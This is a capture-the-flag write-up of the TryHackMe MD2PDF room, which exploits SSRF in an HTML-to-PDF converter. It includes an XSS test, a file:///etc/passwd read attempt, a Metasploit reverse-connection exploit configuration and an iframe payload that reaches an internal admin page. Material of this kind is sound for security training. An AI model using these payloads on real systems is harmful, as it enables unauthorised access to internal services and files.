# TryHackMe – MD2PDF Writeup

## Overview

This room presents a web application called **MD2PDF**, which converts Markdown/HTML input into a PDF file.

The goal is to:

- Enumerate the target services
- Understand how the MD2PDF app works
- Abuse the HTML → PDF conversion to access internal resources (SSRF) and pivot further

---

## 1. Recon & Enumeration

I started with a full Nmap scan against the target machine.

```bash
nmap -A <Machine IP>
````

**Relevant output:**

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  rtsp
5000/tcp open  rtsp
```

Despite being labeled as `rtsp`, both ports 80 and 5000 clearly responded with **HTTP** HTML content when probed.

Nmap HTTP fingerprints showed:

```html
<title>MD2PDF</title>
<textarea class="form-control" name="md" id="md"></textarea>
```

So both:

* `http://MachineIP:80`
* `http://MachineIP:5000`

serve the **MD2PDF** web interface (slightly different paths/static file locations).

---

## 2. Exploring the MD2PDF Web App

Navigating to:

```text
http://MachineIP/
```

I saw a simple web interface:

* A textarea where I can write **Markdown** (or HTML)
* A button to generate a **PDF**

### Basic Functionality Test

I tested with a simple heading:

```markdown
# Hello MD2PDF
```

The app successfully generated a PDF where “Hello MD2PDF” appeared as a heading.
So the core Markdown-to-PDF behavior works as expected.

---

## 3. Initial Payloads (XSS / HTML)

Since the app converts HTML to PDF on the server side, I first tested if JavaScript would execute.

### XSS Test

```html
<h1>TEST_HTML</h1>
<script>alert('xss')</script>
```

**Result:**

* The PDF showed the heading text: `TEST_HTML`
* No alert or visible JavaScript execution took place

This suggests that:

* The rendering engine (likely `wkhtmltopdf` or similar) either does not execute JavaScript in a way we can see, or
* JavaScript is blocked/ignored during PDF generation.

Conclusion: **Classic XSS popups are not useful here**.

---

## 4. Attempting Local File Access

Next, I tried abusing `file://` URLs to read local files from the server.

### `/etc/passwd` Test

```markdown
# file test

<img src="file:///etc/passwd">
```

**Result:**

* The application responded with an error like:

  ```text
  Bad Request

  Something went wrong generating the PDF
  ```

This indicates that:

* Either `file://` URL handling is disabled or restricted, or
* The PDF renderer errored out on this input and the app returned a generic error.

Conclusion: Direct local file inclusion via `file://` did **not** work.

---

## 5. Pivoting to SSRF (Server-Side Request Forgery)

Because the HTML is being rendered server-side into a PDF, any embedded URL (e.g. in `<img>`, `<iframe>`, etc.) will be requested **from the server**, not from my browser. This is a classic SSRF scenario.

### 5.1. First SSRF Attempts

I tried referencing localhost:

```html
<img src="http://127.0.0.1:5000/">
```

This didn’t give me anything useful in the PDF and sometimes resulted in errors like “Bad Request”. So I changed the approach to use an `<iframe>`.

---

## 6. Metasploit Detour (RTSP Module)

At one point, because Nmap showed something like RTSP, I tried using Metasploit.

```bash
msfconsole
msf > search "rtsp"
```

I found the module:

```text
exploit/linux/misc/hikvision_rtsp_bof
```

I attempted to configure it as follows:

```bash
use exploit/linux/misc/hikvision_rtsp_bof
set RHOSTS 10.10.46.231
set RPORT 554
set LHOST <my_tun0_IP>
set LPORT 4444
exploit
```

**Result:**

* `Rex::ConnectionTimeout` on port 554
* `Rex::ConnectionRefused` when trying other ports (80, 5000)
* No session was created

Conclusion:

* The RTSP-centric Metasploit module does not apply here or the RTSP fingerprint was a false positive.
* The proper attack path is **through the web/HTML-to-PDF SSRF**, not via Hikvision RTSP buffer overflow.

---

## 7. Vulnerability Summary

### Vulnerability Type

* **Server-Side Request Forgery (SSRF)** via HTML → PDF rendering

### Root Causes

1. User-supplied HTML is rendered server-side into PDF.
2. The renderer is allowed to fetch remote URLs (including `http://localhost`).
3. The application does not sanitize or restrict tags like `<iframe>` that can embed remote content.
4. An internal admin interface is listening on `http://localhost:5000/admin`, which is assumed to be “internal only”, but is reachable by the renderer.

### Impact

* An attacker can access **internal-only HTTP services** from the MD2PDF server.
* In this case, `http://localhost:5000/admin` is exposed through the PDF output.
* Depending on what the admin panel allows (e.g., configuration uploads, template editing, or command execution), this can often be escalated to:

  * Sensitive data exposure
  * Privilege escalation
  * Remote code execution (RCE)

---

## 11. Conclusion

Steps I took:

1. Enumerated the target with `nmap -A` and identified:

   * SSH on port 22
   * MD2PDF web app on ports 80 and 5000
2. Confirmed the Markdown/HTML → PDF behavior using simple input.
3. Tested for XSS and local file access:

   * `<script>alert('xss')</script>` → no JavaScript execution
   * `file:///etc/passwd` → PDF generation error
4. Switched to SSRF testing by embedding internal URLs.
5. Successfully used:

   ```html
   <iframe src="http://localhost:5000/admin"></iframe>
   ```

   to access an internal admin page via the PDF output.

This demonstrated a clear **SSRF vulnerability** in the MD2PDF application’s HTML-to-PDF pipeline, allowing an attacker to reach internal services on `localhost:5000`.
